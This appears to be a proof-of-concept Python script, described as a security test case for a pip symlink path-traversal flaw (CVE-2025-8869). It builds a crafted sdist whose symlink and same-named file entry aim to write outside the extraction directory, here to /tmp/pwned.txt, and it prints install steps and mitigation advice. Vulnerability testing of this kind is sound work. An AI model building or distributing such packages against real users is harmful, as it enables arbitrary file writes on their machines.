#!/usr/bin/env python3
"""
Test case for CVE-2025-8869 - pip path traversal vulnerability via symlinks in tar archives

This script creates a malicious Python package (sdist) that exploits the pip vulnerability
where symbolic links in tar archives aren't properly validated, allowing arbitrary file writes.

VULNERABILITY: When pip extracts a tar archive, it may not check that symbolic links point
inside the extraction directory, allowing path traversal attacks.

For security testing purposes only.
"""

import tarfile
import io
import os
import tempfile

def create_malicious_package():
    """
    Creates a malicious tar.gz file that exploits CVE-2025-8869.

    The package contains:
    1. A symlink pointing outside the extraction directory (../../tmp/pwned)
    2. A file that writes through that symlink

    This demonstrates the path traversal vulnerability.
    """

    # Create a BytesIO buffer to hold the tar file
    tar_buffer = io.BytesIO()

    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:

        # Create a minimal setup.py for the package
        setup_py_content = b"""from setuptools import setup

setup(
    name='vulnerable-package',
    version='1.0.0',
    description='Test package for CVE-2025-8869',
    author='Security Test',
    packages=[],
)
"""
        setup_info = tarfile.TarInfo(name='vulnerable-package-1.0.0/setup.py')
        setup_info.size = len(setup_py_content)
        tar.addfile(setup_info, io.BytesIO(setup_py_content))

        # Create a malicious symlink that points outside the extraction directory
        # This symlink targets /tmp/pwned (or any sensitive file)
        symlink = tarfile.TarInfo(name='vulnerable-package-1.0.0/malicious_link')
        symlink.type = tarfile.SYMTYPE
        symlink.linkname = '../../tmp/pwned.txt'  # Path traversal!
        tar.addfile(symlink)

        # Create a file that will be written through the symlink
        malicious_content = b"EXPLOITED: This file was written via CVE-2025-8869 path traversal!\n"
        malicious_file = tarfile.TarInfo(name='vulnerable-package-1.0.0/malicious_link')
        malicious_file.size = len(malicious_content)
        tar.addfile(malicious_file, io.BytesIO(malicious_content))

    # Write the malicious package to disk
    tar_buffer.seek(0)
    with open('vulnerable-package-1.0.0.tar.gz', 'wb') as f:
        f.write(tar_buffer.read())

    print("[+] Created malicious package: vulnerable-package-1.0.0.tar.gz")
    print("[!] This package exploits CVE-2025-8869 - pip path traversal vulnerability")
    print("[!] Installing this package with vulnerable pip versions will write to /tmp/pwned.txt")
    print()
    print("To test (in a safe environment):")
    print("  pip install vulnerable-package-1.0.0.tar.gz")
    print()
    print("Expected result on vulnerable pip:")
    print("  File /tmp/pwned.txt will be created with malicious content")
    print()
    print("Affected pip versions: All versions up to pip 25.2")
    print("Mitigation: Upgrade to pip 25.3+ or Python 3.12+")

if __name__ == '__main__':
    create_malicious_package()